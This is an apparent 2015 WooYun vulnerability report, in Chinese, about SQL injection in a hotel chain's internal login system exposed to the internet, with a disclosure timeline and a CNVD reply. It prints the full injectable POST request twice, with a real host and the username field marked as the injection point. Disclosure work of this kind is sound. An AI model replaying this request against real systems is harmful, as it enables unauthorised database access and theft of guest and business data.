wybug_title: 凤凰山水棠樾公寓酒店+凤凰山水巽寮公寓酒店连锁内网系统暴露导致了高危SQL注入，全库泄漏
wybug_corp: 凤凰山水棠樾公寓酒店
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-01-19：	细节已通知厂商并且等待厂商处理中									2015-01-22：	厂商已经确认，细节仅向厂商公开									2015-02-01：	细节向核心白帽子及相关领域专家公开									2015-02-11：	细节向普通白帽子公开									2015-02-21：	细节向实习白帽子公开									2015-03-05：	细节向公众公开  简要描述： 凤凰山水棠樾公寓酒店+凤凰山水巽寮公寓酒店连锁内网系统暴露导致了高危SQL注入，全库泄漏 详细说明：  内网查询系统暴露在了公网导致了注入涉及凤凰山水棠樾公寓酒店凤凰山水巽寮公寓酒店POST注射：
POST /QueryWebs/Account/Login.aspx HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://xlfhssygjr.eicp.net:81/QueryWebs/Account/Login.aspxAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: xlfhssygjr.eicp.net:81Content-Length: 744Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=rkzdmit1rbz3rebqdgjqyjfe__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTA2OTU2MTQ1NQ9kFgJmD2QWAgIDD2QWBgIBDw8WAh4EVGV4dAUe5Yek5Yew5bGx5rC05Lia5Li75p%2Bl6K%2Bi57O757ufZGQCBw8WAh4HVmlzaWJsZWhkAgsPZBYCAg0PEA8WBh4NRGF0YVRleHRGaWVsZAUFYWxpYXMeDkRhdGFWYWx1ZUZpZWxkBQhyZXNvcnRpZB4LXyFEYXRhQm91bmRnZBAVAiTmt7HlnLPlh6Tlh7DlsbHmsLTmo6DmqL7lhazlr5PphZLlupck5rex5Zyz5Yek5Yew5bGx5rC05be95a%2Bu5YWs5a%2BT6YWS5bqXFQIDNDQ3Azc5MxQrAwJnZ2RkZC2AyqQZJ6bQLhGzGRG%2F1iy%2B7DFfMmXwBANlcLN3cJRR&__EVENTVALIDATION=%2FwEWBgK%2F4Mb0CgLM%2F%2FiZCQLDx7adCALP0LixDwLYt%2FSFBALv8O2RCh%2FzsvMKJsakChv%2Bi03AL7tjjEXMBronb0%2F2RqgWjcIC&ctl00%24MainContent%24UserName=asd*&ctl00%24MainContent%24Password=asd&ctl00%24MainContent%24drpResort=447&ctl00%24MainContent%24LoginButton=%E7%99%BB%E5%BD%95
所有内网数据库泄漏

   漏洞证明：  内网查询系统暴露在了公网导致了注入涉及凤凰山水棠樾公寓酒店凤凰山水巽寮公寓酒店POST注射：
POST /QueryWebs/Account/Login.aspx HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://xlfhssygjr.eicp.net:81/QueryWebs/Account/Login.aspxAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: xlfhssygjr.eicp.net:81Content-Length: 744Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=rkzdmit1rbz3rebqdgjqyjfe__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTA2OTU2MTQ1NQ9kFgJmD2QWAgIDD2QWBgIBDw8WAh4EVGV4dAUe5Yek5Yew5bGx5rC05Lia5Li75p%2Bl6K%2Bi57O757ufZGQCBw8WAh4HVmlzaWJsZWhkAgsPZBYCAg0PEA8WBh4NRGF0YVRleHRGaWVsZAUFYWxpYXMeDkRhdGFWYWx1ZUZpZWxkBQhyZXNvcnRpZB4LXyFEYXRhQm91bmRnZBAVAiTmt7HlnLPlh6Tlh7DlsbHmsLTmo6DmqL7lhazlr5PphZLlupck5rex5Zyz5Yek5Yew5bGx5rC05be95a%2Bu5YWs5a%2BT6YWS5bqXFQIDNDQ3Azc5MxQrAwJnZ2RkZC2AyqQZJ6bQLhGzGRG%2F1iy%2B7DFfMmXwBANlcLN3cJRR&__EVENTVALIDATION=%2FwEWBgK%2F4Mb0CgLM%2F%2FiZCQLDx7adCALP0LixDwLYt%2FSFBALv8O2RCh%2FzsvMKJsakChv%2Bi03AL7tjjEXMBronb0%2F2RqgWjcIC&ctl00%24MainContent%24UserName=asd*&ctl00%24MainContent%24Password=asd&ctl00%24MainContent%24drpResort=447&ctl00%24MainContent%24LoginButton=%E7%99%BB%E5%BD%95

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-01-22 17:23 厂商回复： CNVD确认所述漏洞情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无
